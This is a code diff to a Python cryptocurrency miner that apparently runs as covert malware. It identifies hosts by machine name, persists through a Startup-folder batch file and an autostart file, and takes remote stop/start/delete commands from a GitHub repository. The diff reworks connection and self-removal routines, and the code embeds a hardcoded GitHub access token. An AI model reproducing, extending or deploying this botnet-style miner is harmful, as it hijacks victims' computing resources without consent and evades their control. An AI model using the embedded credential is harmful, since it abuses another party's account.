@@ -1,4 +1,4 @@
-import hashlib,json,os,platform,socket,threading,time,urllib.request,base64,uuid
+import hashlib,json,os,platform,socket,threading,time,urllib.request,base64,uuid,shutil
 GITHUB_USER="max1734601-cpu"
 GITHUB_REPO="mining-dashboard"
 GITHUB_TOKEN="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"
@@ -10,7 +10,6 @@ class Miner:
  def __init__(self):
   self.id=f"Miner-{platform.node()[:12]}-{str(uuid.uuid4())[:4]}"
   self.hr=0
-  self.hashes=0
   self.mining=True
   self.connected=True
   self.sock=None
@@ -23,7 +22,7 @@ class Miner:
    s.close()
    return r
   except:return "?"
- def connect(self):
+ def pool_connect(self):
   try:
    self.sock=socket.socket()
    self.sock.settimeout(30)
@@ -59,7 +58,6 @@ class Miner:
       self.send({"id":2,"jsonrpc":"2.0","method":"submit","params":{"id":self.job.get("job_id"),"nonce":format(n,'08x'),"result":hsh}})
      if time.time()-t>=1:
       self.hr=h
-      self.hashes+=h
       h=0
       t=time.time()
      if n%1000==0:time.sleep(0.001)
@@ -105,21 +103,20 @@ class Miner:
       cmd=cmds[self.id]
       if cmd=="stop":self.mining=False
       elif cmd=="start":self.mining=True;self.connected=True
-      elif cmd=="disconnect":self.connected=False
+      elif cmd=="disconnect":self.connected=False;self.mining=False
       elif cmd=="connect":self.connected=True
-      elif cmd=="delete":
-       self.cleanup()
-       os._exit(0)
+      elif cmd=="delete":self.cleanup();os._exit(0)
    except:pass
    time.sleep(10)
  def cleanup(self):
-  import shutil
-  try:shutil.rmtree(f"{os.environ['USERPROFILE']}\\mh")
+  try:shutil.rmtree(os.path.join(os.environ.get('USERPROFILE',os.path.expanduser('~')),'mh'))
   except:pass
-  try:os.remove(f"{os.environ['APPDATA']}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\mh.bat")
+  try:os.remove(os.path.join(os.environ.get('APPDATA',''),'Microsoft','Windows','Start Menu','Programs','Startup','mh.bat'))
+  except:pass
+  try:os.remove(os.path.expanduser('~/.mh_autostart'))
   except:pass
  def start(self):
-  if not self.connect():
+  if not self.pool_connect():
    time.sleep(30)
    return self.start()
   threading.Thread(target=self.update,daemon=True).start()
